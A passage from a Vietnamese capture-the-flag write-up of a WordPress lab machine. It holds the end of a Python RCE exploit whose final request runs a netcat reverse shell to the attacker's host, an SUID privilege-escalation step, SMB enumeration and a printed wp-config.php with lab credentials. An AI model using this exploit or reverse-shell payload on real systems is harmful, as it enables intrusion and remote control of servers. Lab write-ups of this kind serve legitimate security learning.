<a id=__codelineno-7-162 name=__codelineno-7-162 href=#__codelineno-7-162></a><span class=k>if</span> <span class=n>res</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
<a id=__codelineno-7-163 name=__codelineno-7-163 href=#__codelineno-7-163></a>        <span class=n>_wpnonce</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;name=&quot;_wpnonce&quot; value=&quot;(\w+)&quot;&#39;</span><span class=p>,</span><span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
<a id=__codelineno-7-164 name=__codelineno-7-164 href=#__codelineno-7-164></a>        <span class=n>post_id</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;&quot;post&quot;:{&quot;id&quot;:(\w+),&#39;</span><span class=p>,</span><span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
<a id=__codelineno-7-165 name=__codelineno-7-165 href=#__codelineno-7-165></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] Post created successfully . </span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-7-166 name=__codelineno-7-166 href=#__codelineno-7-166></a><span class=k>else</span> <span class=p>:</span>
<a id=__codelineno-7-167 name=__codelineno-7-167 href=#__codelineno-7-167></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[-] Erorr ! Try again </span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-7-168 name=__codelineno-7-168 href=#__codelineno-7-168></a>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<a id=__codelineno-7-169 name=__codelineno-7-169 href=#__codelineno-7-169></a>
<a id=__codelineno-7-170 name=__codelineno-7-170 href=#__codelineno-7-170></a><span class=n>data</span><span class=o>=</span><span class=p>{</span>
<a id=__codelineno-7-171 name=__codelineno-7-171 href=#__codelineno-7-171></a>        <span class=s1>&#39;_wpnonce&#39;</span><span class=p>:</span><span class=n>_wpnonce</span><span class=p>,</span>
<a id=__codelineno-7-172 name=__codelineno-7-172 href=#__codelineno-7-172></a>        <span class=s1>&#39;action&#39;</span><span class=p>:</span><span class=s1>&#39;editpost&#39;</span><span class=p>,</span>
<a id=__codelineno-7-173 name=__codelineno-7-173 href=#__codelineno-7-173></a>        <span class=s1>&#39;post_ID&#39;</span><span class=p>:</span><span class=n>post_id</span><span class=p>,</span>
<a id=__codelineno-7-174 name=__codelineno-7-174 href=#__codelineno-7-174></a>        <span class=s1>&#39;post_title&#39;</span><span class=p>:</span><span class=s1>&#39;RCE poc by v0lck3r&#39;</span><span class=p>,</span>
<a id=__codelineno-7-175 name=__codelineno-7-175 href=#__codelineno-7-175></a>        <span class=s1>&#39;post_name&#39;</span><span class=p>:</span><span class=s1>&#39;RCE poc by v0lck3r&#39;</span><span class=p>,</span>
<a id=__codelineno-7-176 name=__codelineno-7-176 href=#__codelineno-7-176></a>        <span class=s1>&#39;meta_input[_wp_page_template]&#39;</span><span class=p>:</span><span class=s1>&#39;cropped-rahali.jpg&#39;</span>
<a id=__codelineno-7-177 name=__codelineno-7-177 href=#__codelineno-7-177></a><span class=p>}</span>
<a id=__codelineno-7-178 name=__codelineno-7-178 href=#__codelineno-7-178></a><span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;wp-admin/post.php&#39;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
<a id=__codelineno-7-179 name=__codelineno-7-179 href=#__codelineno-7-179></a><span class=k>if</span> <span class=n>res</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
<a id=__codelineno-7-180 name=__codelineno-7-180 href=#__codelineno-7-180></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] POC is ready at : &quot;</span><span class=o>+</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;?p=&#39;</span><span class=o>+</span><span class=n>post_id</span><span class=o>+</span><span class=s1>&#39;&amp;0=id</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<a id=__codelineno-7-181 name=__codelineno-7-181 href=#__codelineno-7-181></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[+] Executing payload !&quot;</span><span class=p>)</span>
<a id=__codelineno-7-182 name=__codelineno-7-182 href=#__codelineno-7-182></a>        <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&quot;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>?p=</span><span class=si>{</span><span class=n>post_id</span><span class=si>}</span><span class=s2>&amp;0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20</span><span class=si>{</span><span class=n>lhost</span><span class=si>}</span><span class=s2>%20</span><span class=si>{</span><span class=n>lport</span><span class=si>}</span><span class=s2>%20%3E%2Ftmp%2Ff&quot;</span><span class=p>,</span><span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
<a id=__codelineno-7-183 name=__codelineno-7-183 href=#__codelineno-7-183></a>
<a id=__codelineno-7-184 name=__codelineno-7-184 href=#__codelineno-7-184></a><span class=k>else</span> <span class=p>:</span>
<a id=__codelineno-7-185 name=__codelineno-7-185 href=#__codelineno-7-185></a>        <span class=nb>print</span><span class=p>(</span><span class=s2>&quot;[-] Erorr ! Try again (maybe change the payload) </span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<a id=__codelineno-7-186 name=__codelineno-7-186 href=#__codelineno-7-186></a>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  
</code></pre></div> <h3 id=privilege-escalation><strong>Privilege Escalation</strong><a class=headerlink href=#privilege-escalation title="Permanent link">&para;</a></h3> <p>Như thường lệ, thì món khai vị phải là kiểm tra quyền sudo (cái này bỏ qua vì làm gì có password của www-data) và suid</p> <blockquote> <p>find / -user root -perm /4000 -type f 2&gt;/dev/null</p> </blockquote> <p> <figure><img src=image-4.png><figcaption>một phần kết quả của việc xem suid</figcaption> </figure> </p> <p>Từ hình ảnh trên ta thấy một file lại là <code>checker</code> ở <code>/usr/sbin</code></p> <p>Ta sẽ thử kiểm tra file checker</p> <details class=tip> <summary>Đừng cóa xem</summary> <p><span class=twemoji><svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m20 8-5.5 5.5-1.41-1.41L16.17 9H10.5C8 9 6 11 6 13.5V20H4v-6.5A6.5 6.5 0 0 1 10.5 7h5.67l-3.09-3.09L14.5 2.5 20 8Z"/></svg></span> Tại máy victim: Thực thi lần lượt</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a><span class=nb>cd </span><span class=p>/</span><span class=n>usr</span><span class=p>/</span><span class=n>sbin</span>
<a id=__codelineno-8-2 name=__codelineno-8-2 href=#__codelineno-8-2></a><span class=n>python3</span> <span class=n>-m</span> <span class=n>http</span><span class=p>.</span><span class=n>server</span>
</code></pre></div> <p><span class=twemoji><svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m20 8-5.5 5.5-1.41-1.41L16.17 9H10.5C8 9 6 11 6 13.5V20H4v-6.5A6.5 6.5 0 0 1 10.5 7h5.67l-3.09-3.09L14.5 2.5 20 8Z"/></svg></span> Tại máy attacker: Thực thi <code>wget http://blog.thm:8000/checker</code></p> </details> <p> <figure><img src=image-5.png><figcaption>Kết quả nội dung hàm main</figcaption> </figure> </p> <p>Từ hình ảnh trên, ta thấy file này có chức năng kiểm tra biến môi trường có tên <code>admin</code> đã được đặt giá trị hay chưa, nếu chưa thì sẽ không có quyền admin còn nếu đã đặt thì sẽ có quyền admin (tức set suid=0)</p> <blockquote> <p>Có thể dùng ghidra để xem chương trình một cách tổng quát hơn</p> </blockquote> <p>Roài từ đây, ta sẽ đặt giá trị cho biến admin và leo quyền root thoai :v</p> <blockquote> <p>Ví dụ <code>admin=r /usr/sbin/checker</code></p> </blockquote> <p> <figure><img src=image-6.png><figcaption>Quyền root</figcaption> </figure> </p> <p>Ta được toàn bộ flag như trong hình</p> <p> <figure><img src=image-7.png><figcaption>Flag</figcaption> </figure> </p> <h2 id=some-problems><strong>Some problems</strong><a class=headerlink href=#some-problems title="Permanent link">&para;</a></h2> <p>Tôi muốn chia sẻ một vài điều về challenge này. Tôi đã lượt bỏ nhiều vấn đề trong mạch chính của kịch bản triển khai và sẽ viết ở tại đây.</p> <h3 id=139-445><strong>139 445</strong><a class=headerlink href=#139-445 title="Permanent link">&para;</a></h3> <p>Với cái tựa đề <a href=#139-445><strong>139 445</strong></a> chắc hẵn ta sẽ chú ý đến SMB</p> <p>Dé, ta vẫn có công đoạn kiểm tra SMB như sau</p> <p> <figure><img src=image-8.png><figcaption>SMBMap</figcaption> </figure> </p> <p>Từ việc kiểm tra bằng smbmap, ta thấy ổ disk BillySMB share và được cấp quyền đọc/ghi. Nhưng làm thế nào để vào disk đó đây?</p> <p>Ta sẽ dùng công cụ enum4linux để xem đường dẫn</p> <p> <figure><img src=image-9.png><figcaption>Terminal</figcaption> </figure> </p> <p>Sau khi có đường dẫn rồi, ta truy cập bằng smbclient</p> <p> <figure><img src=image-10.png><figcaption>Hình ảnh mô tả việc truy cập thành công SMB</figcaption> </figure> </p> <p>:3 get hết 3 file về máy, xem có gì không nha (thông thường sẽ có thể chứ những thông tin cần thiết đã được ẩn giấu trong file)</p> <p>Quan trọng hơn nữa, <code>enum4linux</code> cho ta biết được hệ thống có </p> <p> <figure><img src=image-11.png><figcaption>Hình ảnh cho kết quả có user bjoel</figcaption> </figure> </p> <h3 id=wp-configphp><strong>wp-config.php</strong><a class=headerlink href=#wp-configphp title="Permanent link">&para;</a></h3> <div class=highlight><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-9-1> 1</a></span>
<span class=normal><a href=#__codelineno-9-2> 2</a></span>
<span class=normal><a href=#__codelineno-9-3> 3</a></span>
<span class=normal><a href=#__codelineno-9-4> 4</a></span>
<span class=normal><a href=#__codelineno-9-5> 5</a></span>
<span class=normal><a href=#__codelineno-9-6> 6</a></span>
<span class=normal><a href=#__codelineno-9-7> 7</a></span>
<span class=normal><a href=#__codelineno-9-8> 8</a></span>
<span class=normal><a href=#__codelineno-9-9> 9</a></span>
<span class=normal><a href=#__codelineno-9-10>10</a></span>
<span class=normal><a href=#__codelineno-9-11>11</a></span>
<span class=normal><a href=#__codelineno-9-12>12</a></span>
<span class=normal><a href=#__codelineno-9-13>13</a></span>
<span class=normal><a href=#__codelineno-9-14>14</a></span>
<span class=normal><a href=#__codelineno-9-15>15</a></span>
<span class=normal><a href=#__codelineno-9-16>16</a></span>
<span class=normal><a href=#__codelineno-9-17>17</a></span>
<span class=normal><a href=#__codelineno-9-18>18</a></span>
<span class=normal><a href=#__codelineno-9-19>19</a></span>
<span class=normal><a href=#__codelineno-9-20>20</a></span>
<span class=normal><a href=#__codelineno-9-21>21</a></span>
<span class=normal><a href=#__codelineno-9-22>22</a></span>
<span class=normal><a href=#__codelineno-9-23>23</a></span>
<span class=normal><a href=#__codelineno-9-24>24</a></span>
<span class=normal><a href=#__codelineno-9-25>25</a></span>
<span class=normal><a href=#__codelineno-9-26>26</a></span>
<span class=normal><a href=#__codelineno-9-27>27</a></span>
<span class=normal><a href=#__codelineno-9-28>28</a></span>
<span class=normal><a href=#__codelineno-9-29>29</a></span>
<span class=normal><a href=#__codelineno-9-30>30</a></span>
<span class=normal><a href=#__codelineno-9-31>31</a></span>
<span class=normal><a href=#__codelineno-9-32>32</a></span>
<span class=normal><a href=#__codelineno-9-33>33</a></span>
<span class=normal><a href=#__codelineno-9-34>34</a></span>
<span class=normal><a href=#__codelineno-9-35>35</a></span>
<span class=normal><a href=#__codelineno-9-36>36</a></span>
<span class=normal><a href=#__codelineno-9-37>37</a></span>
<span class=normal><a href=#__codelineno-9-38>38</a></span>
<span class=normal><a href=#__codelineno-9-39>39</a></span>
<span class=normal><a href=#__codelineno-9-40>40</a></span>
<span class=normal><a href=#__codelineno-9-41>41</a></span>
<span class=normal><a href=#__codelineno-9-42>42</a></span>
<span class=normal><a href=#__codelineno-9-43>43</a></span>
<span class=normal><a href=#__codelineno-9-44>44</a></span>
<span class=normal><a href=#__codelineno-9-45>45</a></span>
<span class=normal><a href=#__codelineno-9-46>46</a></span>
<span class=normal><a href=#__codelineno-9-47>47</a></span>
<span class=normal><a href=#__codelineno-9-48>48</a></span>
<span class=normal><a href=#__codelineno-9-49>49</a></span>
<span class=normal><a href=#__codelineno-9-50>50</a></span>
<span class=normal><a href=#__codelineno-9-51>51</a></span>
<span class=normal><a href=#__codelineno-9-52>52</a></span>
<span class=normal><a href=#__codelineno-9-53>53</a></span>
<span class=normal><a href=#__codelineno-9-54>54</a></span>
<span class=normal><a href=#__codelineno-9-55>55</a></span>
<span class=normal><a href=#__codelineno-9-56>56</a></span>
<span class=normal><a href=#__codelineno-9-57>57</a></span>
<span class=normal><a href=#__codelineno-9-58>58</a></span>
<span class=normal><a href=#__codelineno-9-59>59</a></span>
<span class=normal><a href=#__codelineno-9-60>60</a></span>
<span class=normal><a href=#__codelineno-9-61>61</a></span>
<span class=normal><a href=#__codelineno-9-62>62</a></span>
<span class=normal><a href=#__codelineno-9-63>63</a></span>
<span class=normal><a href=#__codelineno-9-64>64</a></span>
<span class=normal><a href=#__codelineno-9-65>65</a></span>
<span class=normal><a href=#__codelineno-9-66>66</a></span>
<span class=normal><a href=#__codelineno-9-67>67</a></span>
<span class=normal><a href=#__codelineno-9-68>68</a></span>
<span class=normal><a href=#__codelineno-9-69>69</a></span>
<span class=normal><a href=#__codelineno-9-70>70</a></span>
<span class=normal><a href=#__codelineno-9-71>71</a></span>
<span class=normal><a href=#__codelineno-9-72>72</a></span>
<span class=normal><a href=#__codelineno-9-73>73</a></span>
<span class=normal><a href=#__codelineno-9-74>74</a></span>
<span class=normal><a href=#__codelineno-9-75>75</a></span>
<span class=normal><a href=#__codelineno-9-76>76</a></span>
<span class=normal><a href=#__codelineno-9-77>77</a></span>
<span class=normal><a href=#__codelineno-9-78>78</a></span>
<span class=normal><a href=#__codelineno-9-79>79</a></span>
<span class=normal><a href=#__codelineno-9-80>80</a></span>
<span class=normal><a href=#__codelineno-9-81>81</a></span>
<span class=normal><a href=#__codelineno-9-82>82</a></span>
<span class=normal><a href=#__codelineno-9-83>83</a></span>
<span class=normal><a href=#__codelineno-9-84>84</a></span>
<span class=normal><a href=#__codelineno-9-85>85</a></span>
<span class=normal><a href=#__codelineno-9-86>86</a></span>
<span class=normal><a href=#__codelineno-9-87>87</a></span>
<span class=normal><a href=#__codelineno-9-88>88</a></span>
<span class=normal><a href=#__codelineno-9-89>89</a></span>
<span class=normal><a href=#__codelineno-9-90>90</a></span>
<span class=normal><a href=#__codelineno-9-91>91</a></span>
<span class=normal><a href=#__codelineno-9-92>92</a></span>
<span class=normal><a href=#__codelineno-9-93>93</a></span>
<span class=normal><a href=#__codelineno-9-94>94</a></span>
<span class=normal><a href=#__codelineno-9-95>95</a></span>
<span class=normal><a href=#__codelineno-9-96>96</a></span>
<span class=normal><a href=#__codelineno-9-97>97</a></span>
<span class=normal><a href=#__codelineno-9-98>98</a></span></pre></div></td><td class=code><div><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1></a><span class=cp>&lt;?php</span>
<a id=__codelineno-9-2 name=__codelineno-9-2></a><span class=sd>/**</span>
<a id=__codelineno-9-3 name=__codelineno-9-3></a><span class=sd> * The base configuration for WordPress</span>
<a id=__codelineno-9-4 name=__codelineno-9-4></a><span class=sd> *</span>
<a id=__codelineno-9-5 name=__codelineno-9-5></a><span class=sd> * The wp-config.php creation script uses this file during the</span>
<a id=__codelineno-9-6 name=__codelineno-9-6></a><span class=sd> * installation. You don&#39;t have to use the web site, you can</span>
<a id=__codelineno-9-7 name=__codelineno-9-7></a><span class=sd> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span>
<a id=__codelineno-9-8 name=__codelineno-9-8></a><span class=sd> *</span>
<a id=__codelineno-9-9 name=__codelineno-9-9></a><span class=sd> * This file contains the following configurations:</span>
<a id=__codelineno-9-10 name=__codelineno-9-10></a><span class=sd> *</span>
<a id=__codelineno-9-11 name=__codelineno-9-11></a><span class=sd> * * MySQL settings</span>
<a id=__codelineno-9-12 name=__codelineno-9-12></a><span class=sd> * * Secret keys</span>
<a id=__codelineno-9-13 name=__codelineno-9-13></a><span class=sd> * * Database table prefix</span>
<a id=__codelineno-9-14 name=__codelineno-9-14></a><span class=sd> * * ABSPATH</span>
<a id=__codelineno-9-15 name=__codelineno-9-15></a><span class=sd> *</span>
<a id=__codelineno-9-16 name=__codelineno-9-16></a><span class=sd> * @link https://codex.wordpress.org/Editing_wp-config.php</span>
<a id=__codelineno-9-17 name=__codelineno-9-17></a><span class=sd> *</span>
<a id=__codelineno-9-18 name=__codelineno-9-18></a><span class=sd> * @package WordPress</span>
<a id=__codelineno-9-19 name=__codelineno-9-19></a><span class=sd> */</span>
<a id=__codelineno-9-20 name=__codelineno-9-20></a>
<a id=__codelineno-9-21 name=__codelineno-9-21></a><span class=cm>/* Custom */</span>
<a id=__codelineno-9-22 name=__codelineno-9-22></a><span class=cm>/*</span>
<a id=__codelineno-9-23 name=__codelineno-9-23></a><span class=cm>define(&#39;WP_HOME&#39;, &#39;/&#39;);</span>
<a id=__codelineno-9-24 name=__codelineno-9-24></a><span class=cm>define(&#39;WP_SITEURL&#39;, &#39;/&#39;); */</span>
<a id=__codelineno-9-25 name=__codelineno-9-25></a>
<a id=__codelineno-9-26 name=__codelineno-9-26></a><span class=c1>// ** MySQL settings - You can get this info from your web host ** //</span>
<a id=__codelineno-9-27 name=__codelineno-9-27></a><span class=sd>/** The name of the database for WordPress */</span>
<a id=__codelineno-9-28 name=__codelineno-9-28></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;DB_NAME&#39;</span><span class=p>,</span> <span class=s1>&#39;blog&#39;</span><span class=p>);</span>
<a id=__codelineno-9-29 name=__codelineno-9-29></a>
<a id=__codelineno-9-30 name=__codelineno-9-30></a><span class=sd>/** MySQL database username */</span>
<a id=__codelineno-9-31 name=__codelineno-9-31></a><span class=hll><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;DB_USER&#39;</span><span class=p>,</span> <span class=s1>&#39;wordpressuser&#39;</span><span class=p>);</span>
</span><a id=__codelineno-9-32 name=__codelineno-9-32></a>
<a id=__codelineno-9-33 name=__codelineno-9-33></a><span class=sd>/** MySQL database password */</span>
<a id=__codelineno-9-34 name=__codelineno-9-34></a><span class=hll><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;DB_PASSWORD&#39;</span><span class=p>,</span> <span class=s1>&#39;LittleYellowLamp90!@&#39;</span><span class=p>);</span>
</span><a id=__codelineno-9-35 name=__codelineno-9-35></a>
<a id=__codelineno-9-36 name=__codelineno-9-36></a><span class=sd>/** MySQL hostname */</span>
<a id=__codelineno-9-37 name=__codelineno-9-37></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;DB_HOST&#39;</span><span class=p>,</span> <span class=s1>&#39;localhost&#39;</span><span class=p>);</span>
<a id=__codelineno-9-38 name=__codelineno-9-38></a>
<a id=__codelineno-9-39 name=__codelineno-9-39></a><span class=sd>/** Database Charset to use in creating database tables. */</span>
<a id=__codelineno-9-40 name=__codelineno-9-40></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;DB_CHARSET&#39;</span><span class=p>,</span> <span class=s1>&#39;utf8&#39;</span><span class=p>);</span>
<a id=__codelineno-9-41 name=__codelineno-9-41></a>
<a id=__codelineno-9-42 name=__codelineno-9-42></a><span class=sd>/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
<a id=__codelineno-9-43 name=__codelineno-9-43></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;DB_COLLATE&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>);</span>
<a id=__codelineno-9-44 name=__codelineno-9-44></a>
<a id=__codelineno-9-45 name=__codelineno-9-45></a><span class=sd>/** Custom FS Method */</span>
<a id=__codelineno-9-46 name=__codelineno-9-46></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;FS_METHOD&#39;</span><span class=p>,</span> <span class=s1>&#39;direct&#39;</span><span class=p>);</span>
<a id=__codelineno-9-47 name=__codelineno-9-47></a>
<a id=__codelineno-9-48 name=__codelineno-9-48></a><span class=sd>/**#@+</span>
<a id=__codelineno-9-49 name=__codelineno-9-49></a><span class=sd> * Authentication Unique Keys and Salts.</span>
<a id=__codelineno-9-50 name=__codelineno-9-50></a><span class=sd> *</span>
<a id=__codelineno-9-51 name=__codelineno-9-51></a><span class=sd> * Change these to different unique phrases!</span>
<a id=__codelineno-9-52 name=__codelineno-9-52></a><span class=sd> * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}</span>
<a id=__codelineno-9-53 name=__codelineno-9-53></a><span class=sd> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span>
<a id=__codelineno-9-54 name=__codelineno-9-54></a><span class=sd> *</span>
<a id=__codelineno-9-55 name=__codelineno-9-55></a><span class=sd> * @since 2.6.0</span>
<a id=__codelineno-9-56 name=__codelineno-9-56></a><span class=sd> */</span>
<a id=__codelineno-9-57 name=__codelineno-9-57></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;AUTH_KEY&#39;</span><span class=p>,</span>         <span class=s1>&#39;ZCgJQaT0(*+Zjo}Iualapeo|?~nMtp^1IUrquYx3!#T$ihW8F~_`L+$N E&gt;J!Bm;&#39;</span><span class=p>);</span>
<a id=__codelineno-9-58 name=__codelineno-9-58></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;SECURE_AUTH_KEY&#39;</span><span class=p>,</span>  <span class=s1>&#39;nz|(+d|| yVX-5_on76q%:M, ?{NVJ,Q(;p3t|_B*]-yQ&amp;|]3}M@Po!f_,T-S4fe&#39;</span><span class=p>);</span>
<a id=__codelineno-9-59 name=__codelineno-9-59></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;LOGGED_IN_KEY&#39;</span><span class=p>,</span>    <span class=s1>&#39;a&amp;I&amp;DR;PUnPKul^kLBgxYa@`g||{eZf&gt;&lt;sf8SmKBi+R7`O?](SuL&amp;/H#hqzO$_:3&#39;</span><span class=p>);</span>
<a id=__codelineno-9-60 name=__codelineno-9-60></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;NONCE_KEY&#39;</span><span class=p>,</span>        <span class=s1>&#39;Vdd-zzB:/yxg6unZvng,oY-%Z V,i%+Uz_f)S;Efz!;cY3p~]T,g1z*Z[jXe&gt;5Sm&#39;</span><span class=p>);</span>
<a id=__codelineno-9-61 name=__codelineno-9-61></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;AUTH_SALT&#39;</span><span class=p>,</span>        <span class=s1>&#39;u+k8g;=jbe)6/X~&lt;M1HwINhH(Tno@orx:$_$-#*id)ddBYGGF(]AP?}4?2E|m;5`&#39;</span><span class=p>);</span>
<a id=__codelineno-9-62 name=__codelineno-9-62></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;SECURE_AUTH_SALT&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;Rg5&gt;,/^BywVg^A[Etqot:CoU+9&lt;)YPM~h|)Ifd5!iK!L*5+JDiZi33KrYZNd2B7&#39;</span><span class=p>);</span>
<a id=__codelineno-9-63 name=__codelineno-9-63></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;LOGGED_IN_SALT&#39;</span><span class=p>,</span>   <span class=s1>&#39;3kpL-rcnU+&gt;H#t/g&gt;9&lt;)j/u I1/-Ws;h6GrDQ&gt;v8%7@C~`h1lBC/euttp)/8EdA_&#39;</span><span class=p>);</span>
<a id=__codelineno-9-64 name=__codelineno-9-64></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;NONCE_SALT&#39;</span><span class=p>,</span>       <span class=s1>&#39;JEajZ)y?&amp;.m-1^$(c-JX$zi0qv|7]F%7a6jh]P5SRs+%`*60?WJVk$&gt;&lt;b$poQg9&gt;&#39;</span><span class=p>);</span>
<a id=__codelineno-9-65 name=__codelineno-9-65></a>
<a id=__codelineno-9-66 name=__codelineno-9-66></a>
<a id=__codelineno-9-67 name=__codelineno-9-67></a><span class=sd>/**#@-*/</span>
<a id=__codelineno-9-68 name=__codelineno-9-68></a>
<a id=__codelineno-9-69 name=__codelineno-9-69></a><span class=sd>/**</span>
<a id=__codelineno-9-70 name=__codelineno-9-70></a><span class=sd> * WordPress Database Table prefix.</span>
<a id=__codelineno-9-71 name=__codelineno-9-71></a><span class=sd> *</span>
<a id=__codelineno-9-72 name=__codelineno-9-72></a><span class=sd> * You can have multiple installations in one database if you give each</span>
<a id=__codelineno-9-73 name=__codelineno-9-73></a><span class=sd> * a unique prefix. Only numbers, letters, and underscores please!</span>
<a id=__codelineno-9-74 name=__codelineno-9-74></a><span class=sd> */</span>
<a id=__codelineno-9-75 name=__codelineno-9-75></a><span class=nv>$table_prefix</span>  <span class=o>=</span> <span class=s1>&#39;wp_&#39;</span><span class=p>;</span>
<a id=__codelineno-9-76 name=__codelineno-9-76></a>
<a id=__codelineno-9-77 name=__codelineno-9-77></a><span class=sd>/**</span>
<a id=__codelineno-9-78 name=__codelineno-9-78></a><span class=sd> * For developers: WordPress debugging mode.</span>
<a id=__codelineno-9-79 name=__codelineno-9-79></a><span class=sd> *</span>
<a id=__codelineno-9-80 name=__codelineno-9-80></a><span class=sd> * Change this to true to enable the display of notices during development.</span>
<a id=__codelineno-9-81 name=__codelineno-9-81></a><span class=sd> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span>
<a id=__codelineno-9-82 name=__codelineno-9-82></a><span class=sd> * in their development environments.</span>
<a id=__codelineno-9-83 name=__codelineno-9-83></a><span class=sd> *</span>
<a id=__codelineno-9-84 name=__codelineno-9-84></a><span class=sd> * For information on other constants that can be used for debugging,</span>
<a id=__codelineno-9-85 name=__codelineno-9-85></a><span class=sd> * visit the Codex.</span>
<a id=__codelineno-9-86 name=__codelineno-9-86></a><span class=sd> *</span>
<a id=__codelineno-9-87 name=__codelineno-9-87></a><span class=sd> * @link https://codex.wordpress.org/Debugging_in_WordPress</span>
<a id=__codelineno-9-88 name=__codelineno-9-88></a><span class=sd> */</span>
<a id=__codelineno-9-89 name=__codelineno-9-89></a><span class=nb>define</span><span class=p>(</span><span class=s1>&#39;WP_DEBUG&#39;</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span>
<a id=__codelineno-9-90 name=__codelineno-9-90></a>
<a id=__codelineno-9-91 name=__codelineno-9-91></a><span class=cm>/* That&#39;s all, stop editing! Happy blogging. */</span>
<a id=__codelineno-9-92 name=__codelineno-9-92></a>
<a id=__codelineno-9-93 name=__codelineno-9-93></a><span class=sd>/** Absolute path to the WordPress directory. */</span>
<a id=__codelineno-9-94 name=__codelineno-9-94></a><span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=nb>defined</span><span class=p>(</span><span class=s1>&#39;ABSPATH&#39;</span><span class=p>)</span> <span class=p>)</span>
<a id=__codelineno-9-95 name=__codelineno-9-95></a>        <span class=nb>define</span><span class=p>(</span><span class=s1>&#39;ABSPATH&#39;</span><span class=p>,</span> <span class=nb>dirname</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>)</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span><span class=p>);</span>
<a id=__codelineno-9-96 name=__codelineno-9-96></a>
<a id=__codelineno-9-97 name=__codelineno-9-97></a><span class=sd>/** Sets up WordPress vars and included files. */</span>
<a id=__codelineno-9-98 name=__codelineno-9-98></a><span class=k>require_once</span><span class=p>(</span><span class=nx>ABSPATH</span> <span class=o>.</span> <span class=s1>&#39;wp-settings.php&#39;</span><span class=p>);</span>
</code></pre></div></td></tr></table></div> <p>Từ file config (bản chất build WordPress thì sẽ có file này) trên, ta thấy được thông tin của database, ta sẽ tiến hành điều tra database vì mục đích của ta sẽ lấy password của user bjoel. </p> <blockquote> <p>Như ta đã khai thác ở phần <a href=#pentest-scenario>kịch bản</a> thì việc tìm được password của user bjoel ở ngữ cảnh challenge này sẽ không thực sự cần thiết cũng như là có ích cho chúng ta về điều gì cả nhưng tôi muốn đề cập ở đây là sẽ có thể tồn tại 1 challenge nào đó hoặc tối thiểu sẽ mở ra một hướng /một cách nhìn mới đối với công việc của một redteam thay vì pentester.</p> </blockquote> <p>Tiến hành vào mysql bằng</p> <p><div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a><span class=n>mysql</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=n>wordpressuser</span><span class=w> </span><span class=o>-</span><span class=n>p</span>
<a id=__codelineno-10-2 name=__codelineno-10-2 href=#__codelineno-10-2></a><span class=n>LittleYellowLamp90</span><span class=o>!@</span>
